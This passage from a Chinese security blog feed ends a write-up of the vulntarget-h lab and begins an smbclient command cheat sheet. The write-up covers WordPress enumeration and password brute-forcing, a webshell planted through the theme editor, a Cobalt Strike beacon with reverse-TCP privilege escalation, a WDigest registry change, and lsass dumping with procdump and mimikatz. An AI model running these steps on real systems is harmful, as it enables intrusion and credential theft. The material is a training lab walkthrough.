class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ proxychains4 wpscan --url http://192.168.153.129</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.8.22</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.129:80  ...  OK</span></span><br><span class="line"><span class="string">[+] URL: http://192.168.153.129/ [192.168.153.129]</span></span><br><span class="line"><span class="string">[+] Started: Sat Jul  2 09:34:04 2022</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Headers</span></span><br><span class="line"><span class="string"> | Interesting Entries:</span></span><br><span class="line"><span class="string"> |  - Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span></span><br><span class="line"><span class="string"> |  - X-Powered-By: PHP/7.3.4</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] robots.txt found: http://192.168.153.129/robots.txt</span></span><br><span class="line"><span class="string"> | Interesting Entries:</span></span><br><span class="line"><span class="string"> |  - /wp-admin/</span></span><br><span class="line"><span class="string"> |  - /wp-admin/admin-ajax.php</span></span><br><span class="line"><span class="string"> | Found By: Robots Txt (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] XML-RPC seems to be enabled: http://192.168.153.129/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress readme found: http://192.168.153.129/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] The external WP-Cron seems to be enabled: http://192.168.153.129/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 5.9.2 identified (Outdated, released on 2022-03-11).</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.153.129/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9.2&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> |  - http://192.168.153.129/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.9.2&lt;/generator&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress theme in use: twentytwentytwo</span></span><br><span class="line"><span class="string"> | Location: http://192.168.153.129/wp-content/themes/twentytwentytwo/</span></span><br><span class="line"><span class="string"> | Last Updated: 2022-05-24T00:00:00.000Z</span></span><br><span class="line"><span class="string"> | Readme: http://192.168.153.129/wp-content/themes/twentytwentytwo/readme.txt</span></span><br><span class="line"><span class="string"> | [!] The version is out of date, the latest version is 1.2</span></span><br><span class="line"><span class="string"> | Style URL: http://192.168.153.129/wp-content/themes/twentytwentytwo/style.css?ver=1.1</span></span><br><span class="line"><span class="string"> | Style Name: Twenty Twenty-Two</span></span><br><span class="line"><span class="string"> | Style URI: https://wordpress.org/themes/twentytwentytwo/</span></span><br><span class="line"><span class="string"> | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...</span></span><br><span class="line"><span class="string"> | Author: the WordPress team</span></span><br><span class="line"><span class="string"> | Author URI: https://wordpress.org/</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Css Style In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Css Style In 404 Page (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.1 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Style (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.153.129/wp-content/themes/twentytwentytwo/style.css?ver=1.1, Match: &#x27;</span>Version: 1.1<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating All Plugins (via Passive Methods)</span></span><br><span class="line"><span class="string">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Plugin(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] mail-masta</span></span><br><span class="line"><span class="string"> | Location: http://192.168.153.129/wp-content/plugins/mail-masta/</span></span><br><span class="line"><span class="string"> | Latest Version: 1.0 (up to date)</span></span><br><span class="line"><span class="string"> | Last Updated: 2014-09-19T07:52:00.000Z</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Found By: Urls In Homepage (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Urls In 404 Page (Passive Detection)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> | Version: 1.0 (80% confidence)</span></span><br><span class="line"><span class="string"> | Found By: Readme - Stable Tag (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.153.129/wp-content/plugins/mail-masta/readme.txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.129:80  ...  OK                                         &gt; (0 / 137)  0.00%  ETA: ??:??:??</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.129:80  ...  OK</span></span><br><span class="line"><span class="string"> Checking Config Backups - Time: 00:04:37 &lt;=============================================================================&gt; (137 / 137) 100.00% Time: 00:04:37</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Config Backups Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Sat Jul  2 09:42:55 2022</span></span><br><span class="line"><span class="string">[+] Requests Done: 172</span></span><br><span class="line"><span class="string">[+] Cached Requests: 7</span></span><br><span class="line"><span class="string">[+] Data Sent: 43.302 KB</span></span><br><span class="line"><span class="string">[+] Data Received: 372.511 KB</span></span><br><span class="line"><span class="string">[+] Memory used: 227.586 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:08:51</span></span><br></pre></td></tr></table></figure><ul><li>通过上面的数据并没有找到有用的信息。接下来尝试获取所有用户。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ proxychains4 wpscan --url http://192.168.153.129 -e u</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.8.22</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.129:80  ...  OK</span></span><br><span class="line"><span class="string">[+] URL: http://192.168.153.129/ [192.168.153.129]</span></span><br><span class="line"><span class="string">[+] Started: Sat Jul  2 09:45:48 2022</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[proxychains] Strict chain  ...  127.0.0.1:45483  ...  192.168.153.129:80  ...  OK</span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">[i] User(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] root</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By:</span></span><br><span class="line"><span class="string"> |  Wp Json Api (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |   - http://192.168.153.129/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span></span><br><span class="line"><span class="string"> |  Author Sitemap (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |   - http://192.168.153.129/wp-sitemap-users-1.xml</span></span><br><span class="line"><span class="string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Sat Jul  2 09:46:30 2022</span></span><br><span class="line"><span class="string">[+] Requests Done: 36</span></span><br><span class="line"><span class="string">[+] Cached Requests: 25</span></span><br><span class="line"><span class="string">[+] Data Sent: 9.471 KB</span></span><br><span class="line"><span class="string">[+] Data Received: 558.291 KB</span></span><br><span class="line"><span class="string">[+] Memory used: 205.469 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:42</span></span><br></pre></td></tr></table></figure><ul><li>通过上面的数据发现只有一个root的用户应该是管理员我们使用<code>wpscan</code>暴力破解看看。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/CS4.4完全汉化版破解]</span><br><span class="line">└─$ proxychains4 wpscan --url http://192.168.153.129 -U root -P top100.txt</span><br><span class="line">...</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:6033  ...  192.168.153.129:80  ...  OK</span><br><span class="line">Trying root / 333333 Time: 00:04:30 &lt;=====================================================================================&gt; (99 / 99) 100.00% Time: 00:04:30</span><br><span class="line"></span><br><span class="line">[i] No Valid Passwords Found.</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Sat Jul  2 10:20:15 2022</span><br><span class="line">[+] Requests Done: 239</span><br><span class="line">[+] Cached Requests: 41</span><br><span class="line">[+] Data Sent: 87.511 KB</span><br><span class="line">[+] Data Received: 220.998 KB</span><br><span class="line">[+] Memory used: 229.191 MB</span><br><span class="line">[+] Elapsed time: 00:06:39</span><br></pre></td></tr></table></figure><ul><li>我目前的密码字典目前不能破解。只能看看会不会有密码泄漏，在靶场搭建页面有密码我们我们就使用该密码尝试登陆。</li></ul><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_10-51-22.png" alt="Screenshot_2022-07-02_10-51-22.png"></p><h4 id="上传木马-1"><a href="#上传木马-1" class="headerlink" title="上传木马"></a>上传木马</h4><ul><li>接下来我们就可以通过<strong>主题文件编辑器</strong>功能写入一句话木马。</li></ul><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_11-02-37.png" alt="Screenshot_2022-07-02_11-02-37.png"></p><ul><li>我选择在<code>inc/patterns/hidden-404.php</code>文件写入命令执行。</li></ul><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_11-31-18.png" alt="Screenshot_2022-07-02_11-31-18.png"></p><ul><li>测试写入的代码是否可以执行。</li></ul><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_11-33-03.png" alt="Screenshot_2022-07-02_11-33-03.png"></p><ul><li>将上传Windows 7的木马到Windows 10。这里通过在WordPress官网下载随便一个插件然后把我们的木马放进压缩包再上传。</li></ul><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_12_13_31.png" alt="Screenshot_2022-07-02_12_13_31.png"></p><ul><li>然后通过我们在主题写入命令执行该文件就可以了。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ proxychains4 curl 192.168.153.129/a -d <span class="string">&quot;1=wp-content\plugins\classic-editor\js\a.ini&quot;</span></span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:6033  ...  192.168.153.129:80  ...  OK</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;500 错误 - phpstudy&lt;/title&gt;</span><br><span class="line">  &lt;meta name=<span class="string">&quot;keywords&quot;</span> content=<span class="string">&quot;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_12_27_30.png" alt="Screenshot_2022-07-02_12_27_30.png"></p><ul><li>提升到SYSTEM权限。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; elevate svc-exe b_192.168.153.130</span><br><span class="line">[*] Tasked beacon to run windows/beacon_reverse_tcp (192.168.153.130:4444) via Service Control Manager (\\127.0.0.1\ADMIN$\ba77d60.exe)</span><br><span class="line">[+] host called home, sent: 285738 bytes</span><br><span class="line">[+] host called home, sent: 1819 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">Started service ba77d60 on .</span><br></pre></td></tr></table></figure><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_12-30-57.png" alt="Screenshot_2022-07-02_12-30-57.png"></p><ul><li><p>接下来就是抓取明文密码了。由于Windows 10抓取密码方式不一样，需要先修改注册表等待重新登陆再截取dmp文件。</p></li><li><p>修改注册表。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="line">[*] Tasked beacon to run: reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="line">[+] host called home, sent: 145 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">操作成功完成。</span><br></pre></td></tr></table></figure><ul><li>使用<code>logoff</code>命令注销windows10用户。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell logoff</span><br><span class="line">[*] Tasked beacon to run: logoff</span><br><span class="line">[+] host called home, sent: 37 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"><span class="string">&#x27;logoff&#x27;</span> 不是内部或外部命令，也不是可运行的程序</span><br><span class="line">或批处理文件。</span><br></pre></td></tr></table></figure><ul><li>在CS无法执行<code>logoff</code>命令，只能通过命令执行。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ proxychains4 curl 192.168.153.129/a -d <span class="string">&quot;1=logoff&quot;</span>                    </span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.16</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:6033  ...  192.168.153.129:80  ...  OK</span><br></pre></td></tr></table></figure><ul><li>上传<code>procdump64.exe</code>。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; upload</span><br><span class="line">[*] Tasked beacon to upload /home/kali/Desktop/procdump64.exe as procdump64.exe</span><br><span class="line">[+] host called home, sent: 401322 bytes</span><br></pre></td></tr></table></figure><ul><li>使用<code>procdump64.exe</code>抓取dmp文件。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell procdump64.exe -accepteula -ma lsass.exe 1.dmp</span><br><span class="line">[*] Tasked beacon to run: procdump64.exe -accepteula -ma lsass.exe 1.dmp</span><br><span class="line">[+] host called home, sent: 77 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">ProcDump v10.11 - Sysinternals process dump utility</span><br><span class="line">Copyright (C) 2009-2021 Mark Russinovich and Andrew Richards</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">[01:08:16] Dump 1 initiated: C:\phpstudy_pro\WWW\1.dmp</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">[01:08:18] Dump 1 writing: Estimated dump file size is 46 MB.</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">[01:08:19] Dump 1 complete: 46 MB written <span class="keyword">in</span> 2.4 seconds</span><br><span class="line"></span><br><span class="line">[+] received output:</span><br><span class="line">[01:08:19] Dump count reached.</span><br></pre></td></tr></table></figure><ul><li>下载dmp文件。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; download 1.dmp</span><br><span class="line">[*] Tasked beacon to download 1.dmp</span><br><span class="line">[+] host called home, sent: 13 bytes</span><br><span class="line">[*] started download of C:\phpstudy_pro\WWW\1.dmp (46832222 bytes)</span><br></pre></td></tr></table></figure><ul><li>使用<code>mimikatz</code>读取密码。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ wine /usr/share/windows-resources/mimikatz/x64/mimikatz.exe <span class="string">&quot;sekurlsa::minidump e723ff153&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="built_in">exit</span></span><br><span class="line">0040:err:winediag:SECUR32_initNTLMSP ntlm_auth was not found or is outdated. Make sure that ntlm_auth &gt;= 3.0.25 is <span class="keyword">in</span> your path. Usually, you can find it <span class="keyword">in</span> the winbind package of your distribution.</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line">&gt;&gt;&gt; INIT of <span class="string">&#x27;kerberos&#x27;</span> module failed : c0000001</span><br><span class="line">0050:err:ole:start_rpcss Failed to open RpcSs service</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># sekurlsa::minidump e723ff153</span></span><br><span class="line">Switch to MINIDUMP : <span class="string">&#x27;e723ff153&#x27;</span></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># sekurlsa::logonPasswords full</span></span><br><span class="line">Opening : <span class="string">&#x27;e723ff153&#x27;</span> file <span class="keyword">for</span> minidump...</span><br><span class="line">ERROR kuhl_m_sekurlsa_acquireLSA ; Local LSA library failed</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure><ul><li><p>通过上方的返回结果应该是给杀毒拦截了。</p></li><li><p>尝试使用CS抓取明文密码功能发现可以直接抓到。</p></li></ul><p><img src="/../images/vulntarget-h%20write-up/Screenshot_2022-07-02_23-43-19.png" alt="Screenshot_2022-07-02_23-43-19.png"></p><h2 id="完"><a href="#完" class="headerlink" title="完"></a>完</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Vulntarget漏洞靶场&lt;/p&gt;
&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/crow821/vulntarget&quot;&gt;https://github.com/crow821/vulntarget&lt;/a&gt;&lt;/p&gt;
&lt;/b</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>smbclient 命令备忘录</title>
    <link href="http://webb-l.top/2022/05/30/smbclient-%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>http://webb-l.top/2022/05/30/smbclient-%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/</id>
    <published>2022-05-30T08:58:38.000Z</published>
    <updated>2022-06-04T03:46:39.742Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>使用该命令的前提您的目标设备必须要开启smb服务和设置共享文件。</p></blockquote><h2 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient [选项] 服务 &lt;密码&gt;</span><br></pre></td></tr></table></figure><h2 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h2><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>-M, –message&#x3D;HOST</td><td>发信息</td></tr><tr><td>-I, –ip-address&#x3D;IP</td><td>使用此 IP 连接到</td></tr><tr><td>-E, –stderr</td><td>将消息写入标准错误而不是标准输出</td></tr><tr><td>-L, –list&#x3D;HOST</td><td>获取主机上可用的共享列表</td></tr><tr><td>-T, –tar&#x3D;&lt;c&#x2F;x&gt;IXFvgbNan</td><td>命令行tar</td></tr><tr><td>-D, –directory&#x3D;DIR</td><td>从某个目录开始</td></tr><tr><td>-c, –command&#x3D;STRING</td><td>执行命令</td></tr><tr><td>-b, –send-buffer&#x3D;BYTES</td><td>更改发送&#x2F;发送缓冲区</td></tr><tr><td>-t, –timeout&#x3D;SECONDS</td><td>更改每个操作的超时</td></tr><tr><td>-p, –port&#x3D;PORT</td><td>要连接的端口</td></tr><tr><td>-g, –grepable</td><td>产生 grepable 输出</td></tr><tr><td>-q, –quiet</td><td>禁止显示帮助消息</td></tr><tr><td>-B, –browse</td><td>使用 DNS 浏览 SMB 服务器</td></tr></tbody></table><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>?&#x2F;help 命令</td><td>查看某个命令帮助信息</td></tr><tr><td>allinfo &lt;file&gt;</td><td>显示所有可用信息</td></tr><tr><td>altname &lt;file&gt;</td><td>显示替代名称</td></tr><tr><td>archive &lt;level&gt;</td><td>0&#x3D;忽略存档位<br/>1&#x3D;只获取存档文件<br/>2&#x3D;仅获取存档文件并重置存档位<br/>3&#x3D;获取所有文件并重置存档位</td></tr><tr><td>backup</td><td>切换备份意图状态</td></tr><tr><td>blocksize 